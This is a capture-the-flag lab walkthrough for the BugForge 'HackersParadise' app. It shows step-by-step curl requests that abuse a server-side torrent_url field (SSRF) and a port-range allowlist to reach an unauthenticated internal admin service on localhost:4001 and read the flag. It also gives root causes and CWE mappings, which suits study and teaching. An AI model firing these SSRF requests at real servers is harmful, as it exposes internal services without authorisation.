# hackersparadise-002 - BugForge Lab Walkthrough

**URL:** https://lab-1784665771674-hg6um9.labs-app.bugforge.io/
**Difficulty:** Medium
**Vulnerability:** SSRF via user-controlled `torrent_url`, port-range allowlist bypass to an internal admin service
**Flag:** `bug{WoT5lVj5quHPtxCGcBChzxcgnNpQJezt}`

---

## Summary

HackersParadise is a Y2K-themed "underground mall" app with a LimeWire-style P2P file browser. The download action, `POST /api/limewire/download`, takes a `torrent_url` body field and forwards it server-side to fetch the file, forming a classic SSRF sink. The validator allowlists a port range on `localhost` rather than a single port, so the same request that legitimately reaches the torrent service on port 4000 also reaches an unrelated internal admin service on port 4001. The admin service exposes an `/admin/flag` endpoint that intentionally teases with `{"error":"You're so close"}`; the real flag sits at the `.txt` variant of that path.

## Tech Stack

- Express.js (`x-powered-by: Express`)
- Server-rendered HTML pages + vanilla JS (`/js/app.js`, `/js/limewire.js`, `/js/shop.js`, `/js/profile.js`, `/js/redpillconsole.js`)
- JWT (HS256) stored in `localStorage`, roles observed: `bluepill` (default), `redpill` (privileged, unlocks `/redpillconsole.html`)
- Internal microservices on the Docker network: torrent service on `localhost:4000`, a separate admin service on `localhost:4001`

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/auth/register` / `/api/auth/login` | none | issues JWT, default role `bluepill` |
| `GET /api/limewire/files` | Bearer | seeded file list, each entry carries a `torrent_url` pointing at `http://localhost:4000/torrent/download/<file>` |
| `POST /api/limewire/download` | Bearer | vulnerable - takes `{"torrent_url": "..."}` and fetches it server-side, returns the response body |

## Attack Chain

1. Register and log in:
   ```bash
   TARGET="https://lab-1784665771674-hg6um9.labs-app.bugforge.io"
   curl -s -X POST "$TARGET/api/auth/register" -H "Content-Type: application/json" \
     -d '{"username":"pentest1","password":"Password123!"}'
   curl -s -X POST "$TARGET/api/auth/login" -H "Content-Type: application/json" \
     -d '{"username":"pentest1","password":"Password123!"}'
   ```

2. List seeded files to learn the legitimate `torrent_url` shape:
   ```bash
   curl -s "$TARGET/api/limewire/files" -H "Authorization: Bearer $TOKEN"
   # torrent_url: http://localhost:4000/torrent/download/<filename>
   ```

3. Confirm the URL is attacker-controlled by requesting the service root instead of a real file path:
   ```bash
   curl -s -X POST "$TARGET/api/limewire/download" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"torrent_url":"http://localhost:4000/"}'
   # -> {"success":true,"data":{"status":"online","endpoints":["/torrent","/redpillconsole","/rabbithole"]}}
   ```

4. Port sweep - port 3000 is rejected by the validator, but 4001 (adjacent to the legitimate 4000) is allowed:
   ```bash
   curl -s -X POST "$TARGET/api/limewire/download" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"torrent_url":"http://localhost:3000/"}'
   # -> {"success":false,"message":"Invalid service URL."}

   curl -s -X POST "$TARGET/api/limewire/download" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"torrent_url":"http://localhost:4001/"}'
   # -> {"success":true,"data":{"status":"online","clearence-level":"admin"}}
   ```
   The allowlist accepts a port range rather than a single exact port, so port 4001 (a completely different internal service) is reachable through the same validator that was meant to scope requests to the torrent service on 4000.

5. Enumerate the admin service on 4001:
   ```bash
   curl -s -X POST "$TARGET/api/limewire/download" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"torrent_url":"http://localhost:4001/admin/flag"}'
   # -> {"success":true,"data":{"error":"You're so close"}}
   ```

6. The tease response is a deliberate near-miss - try the `.txt` variant of the same path:
   ```bash
   curl -s -X POST "$TARGET/api/limewire/download" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"torrent_url":"http://localhost:4001/admin/flag.txt"}'
   # -> {"success":true,"data":{"flag":"bug{WoT5lVj5quHPtxCGcBChzxcgnNpQJezt}"}}
   ```

## Discovery Notes

Reading `/js/limewire.js` showed `triggerDownload()` posting `{ torrent_url: file.torrent_url }` straight from a client-controlled object to `/api/limewire/download` - the frontend never restricts the value to one of the seeded files, so any string reaches the endpoint. Port 4000 itself leaked its own sibling endpoint map (`/torrent`, `/redpillconsole`, `/rabbithole`) on the root path, and separately probing port 4001 (one above the known-good port) landed on a completely different service self-identifying as `"clearence-level":"admin"`.

## Dead Ends

| Attempted | Result | Lesson |
|---|---|---|
| `http://localhost:3000/` | `{"success":false,"message":"Invalid service URL."}` | The main app port itself is explicitly blocked - the allowlist is scoped to the internal-service port range, not "any localhost port" |
| `http://localhost:4002/` | `{"success":false,"message":"Invalid service URL."}` | Range stops at 4001, doesn't extend further |
| `/redpillconsole/*` sub-paths on port 4000 | all `{"clearance":"redpill-only", ...}` or `"Not Authorized"` | Real functionality gated behind a role check even via SSRF - not the intended path here |
| `4001/admin/secret`, `/admin/console`, `/admin/users`, `/admin/clearance` | all `{"error":"You're so close"}` | Same generic tease for every wrong guess under `/admin/*` - only `/admin/flag.txt` is real |

## Root Causes

- `torrent_url` is taken directly from the client and fetched server-side with no allowlist against the actual set of legitimate torrent URLs (or even hostname pinning to the torrent service).
- The URL validator checks a port *range* (`4000-4001`) instead of a single exact port, so an unrelated internal admin service sharing the range boundary becomes reachable.
- The admin service itself has no authentication - reachability alone was sufficient to read the flag, no admin token or session required.

## CWE / OWASP

- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-284: Improper Access Control (unauthenticated internal admin service)
- OWASP A10:2021 - Server-Side Request Forgery
